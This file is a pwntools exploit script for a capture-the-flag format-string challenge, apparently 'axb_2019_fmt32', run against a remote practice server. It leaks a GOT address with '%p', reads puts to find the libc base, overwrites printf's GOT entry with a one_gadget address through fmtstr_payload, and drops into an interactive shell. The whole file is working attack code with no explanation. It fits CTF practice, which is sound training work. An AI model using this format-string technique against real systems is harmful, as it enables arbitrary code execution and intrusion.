from os import system
from pwn import *
# context.log_level='debug'
# sh=process("./axb_2019_fmt32")
sh=remote("node4.buuoj.cn","27338")
libc=ELF("./libc-2.23.so")
# payload=".aaaa.%8$p"
# payload="%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."

payload="%p"# 0x1793
sh.recvuntil(":")
sh.sendline(payload)
sh.recvuntil(":")
exit_got=int(sh.recv(9),16)+0x1793
log.info("exit_got: "+hex(exit_got))

puts_got=exit_got-0x4
payload2=".{}.%8$s".format(p32(puts_got))
sh.sendline(payload2)

sh.recvuntil(".")
sh.recvuntil(".")
puts_got=u32(sh.recv(4))
log.info("puts_got: "+hex(puts_got))
libc_base=puts_got-libc.symbols['puts']
log.info("libc_base: "+hex(libc_base))
one_addr=libc_base+0x3a80c
log.info("one_addr: "+hex(one_addr))
printf_got=exit_got-0xc


payload3="."+fmtstr_payload(8,{printf_got:one_addr},0xa)
sh.recvuntil(":")
sh.sendline(payload3)

payload4="a"*0x210
sh.recvuntil(":")
sh.sendline(payload4)
# gdb.attach(sh)
# pause()
sh.interactive()